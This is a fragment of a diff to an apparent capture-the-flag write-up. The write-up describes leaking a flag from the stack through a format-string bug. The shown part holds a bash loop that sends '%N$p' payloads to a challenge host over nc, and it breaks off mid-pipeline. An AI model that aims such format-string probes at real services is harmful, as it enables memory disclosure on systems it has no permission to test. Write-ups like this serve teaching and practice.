@@ -20,10 +20,9 @@ Classic leak the flag from the stack with `%p`.
 
 ## Exploit
 
-```sh
+```bash
 #!/bin/bash
 
-p=8
 for((p=8;p<14;p++)) {
     echo '%'$p'$p' | \
     nc dctf-chall-readme.westeurope.azurecontainer.io 7481 | \
